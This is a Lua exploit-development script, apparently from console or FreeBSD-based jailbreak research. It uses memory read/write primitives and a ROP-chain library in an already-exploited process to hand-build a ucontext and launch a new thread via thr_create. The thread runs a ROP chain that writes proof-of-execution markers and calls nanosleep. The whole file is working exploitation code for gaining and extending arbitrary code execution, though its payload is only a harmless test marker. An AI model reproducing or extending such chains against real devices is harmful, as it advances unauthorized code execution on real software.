-- CRASH_CLASS: MODERATE
-- PROBE 126d: Create a live thread via thr_create CS=0x43 with ROP chain
-- Thread stack is a ROP chain that writes proof-of-execution markers
-- and sleeps to stay alive for the main thread to observe.

print("=== PROBE 126d: LIVE THREAD ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Build syscall helper
local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

local sc_thr_create = make_sc(430)
local sc_thr_kill = make_sc(433)
local sc_nanosleep = make_sc(240)

-- Shared memory for proof of execution
local shared = memory.alloc(64)
for off = 0, 56, 8 do memory.write_qword(shared + off, 0) end
-- shared+0: thread writes 0xAAAA here (proof it started)
-- shared+8: thread writes 0xBBBB here (proof it survived nanosleep)
-- shared+16: main writes here to signal thread to exit

print("shared=" .. tostring(shared))

-- Build a ROP chain for the thread
-- The thread will:
-- 1. Write 0xAAAA to shared+0
-- 2. nanosleep(0.5s)
-- 3. Write 0xBBBB to shared+8
-- 4. thr_exit

print("")
print("--- BUILDING THREAD ROP CHAIN ---")

local thread_chain = ropchain:new({stack_size = 0x4000})
-- Step 1: Write proof marker to shared+0
thread_chain:push_write_qword_memory(shared, uint64(0xAAAA))
-- Step 2: nanosleep for 500ms
local timespec = memory.alloc(16)
memory.write_qword(timespec, 0)          -- tv_sec = 0
memory.write_qword(timespec + 8, 500000000)  -- tv_nsec = 500ms
thread_chain:push_syscall(sc_nanosleep, timespec)
-- Step 3: Write second proof marker
thread_chain:push_write_qword_memory(shared + 8, uint64(0xBBBB))
-- Step 4: thr_exit (syscall 431)
local sc_thr_exit = make_sc(431)
thread_chain:push_syscall(sc_thr_exit, 0)
-- Don't need longjmp restore since thread exits
-- But add a safety ret
thread_chain:push_ret()

-- Get the chain's stack base (where RSP should point)
local chain_rsp = thread_chain.stack_base
print("thread chain base=" .. tostring(chain_rsp))

-- Build ucontext
local ucontext = memory.alloc(0x400)
for off = 0, 0x3FC, 4 do memory.write_dword(ucontext + off, 0) end

local mc = ucontext + 0x10
-- mc_rip = ret gadget (first thing: pop from stack = start of ROP chain)
memory.write_qword(mc + 0x88, gadgets.ret)   -- mc_rip
memory.write_dword(mc + 0x90, 0x43)          -- mc_cs
memory.write_qword(mc + 0x98, uint64(0x202)) -- mc_rflags
memory.write_qword(mc + 0xA0, chain_rsp)     -- mc_rsp = ROP chain start
memory.write_dword(mc + 0xA8, 0x3B)          -- mc_ss

print("mc_rip=" .. tostring(memory.read_qword(mc + 0x88)))
print("mc_rsp=" .. tostring(memory.read_qword(mc + 0xA0)))
print("mc_cs=0x43 mc_ss=0x3B")

-- Check shared before
print("shared[0] before=" .. tostring(memory.read_qword(shared)))
print("shared[8] before=" .. tostring(memory.read_qword(shared + 8)))

-- Create the thread
print("")
print("*** CREATING THREAD ***")
local new_tid_buf = memory.alloc(8)
memory.write_qword(new_tid_buf, 0)

local ok_create, err_create = pcall(function()
    local chain = ropchain:new()
    chain:push_syscall_with_ret(sc_thr_create, ucontext, new_tid_buf, 0)
    chain:restore_through_longjmp()
    chain:execute_through_coroutine()

    local ret_addr = chain:get_last_retval_addr()
    if ret_addr then
        local ret_val = memory.read_qword(ret_addr)
        print("thr_create ret=" .. tostring(ret_val))
    end
end)
print("create: ok=" .. tostring(ok_create) .. " err=" .. tostring(err_create))

local new_tid = to_num(memory.read_qword(new_tid_buf))
print("new_tid=" .. new_tid)

-- Wait a bit for thread to execute
print("")
print("--- MONITORING THREAD ---")
for i = 1, 10 do
    sleep(0.1, 's')
    local s0 = to_num(memory.read_qword(shared))
    local s8 = to_num(memory.read_qword(shared + 8))
    print(string.format("  t=%.1fs: shared[0]=0x%X shared[8]=0x%X", i * 0.1, s0, s8))

    if s0 == 0xAAAA then
        print("  *** THREAD EXECUTED! ***")
    end
    if s8 == 0xBBBB then
        print("  *** THREAD SURVIVED NANOSLEEP! ***")
        break
    end
end

-- Check thread status
if new_tid > 0 then
    local ok_k, err_k = pcall(function()
        local chain = ropchain:new()
        chain:push_syscall_with_ret(sc_thr_kill, new_tid, 0)
        chain:restore_through_longjmp()
        chain:execute_through_coroutine()
        local ret_addr = chain:get_last_retval_addr()
        if ret_addr then
            print("thr_kill(tid,0)=" .. to_num(memory.read_qword(ret_addr)))
        end
    end)
end

-- Final state
print("")
print("--- FINAL STATE ---")
print("shared[0]=" .. tostring(memory.read_qword(shared)))
print("shared[8]=" .. tostring(memory.read_qword(shared + 8)))

local canary_ok = pcall(function() return to_num(syscall.getpid()) end)
print("canary: " .. tostring(canary_ok))

print("=== PROBE 126d COMPLETE ===")
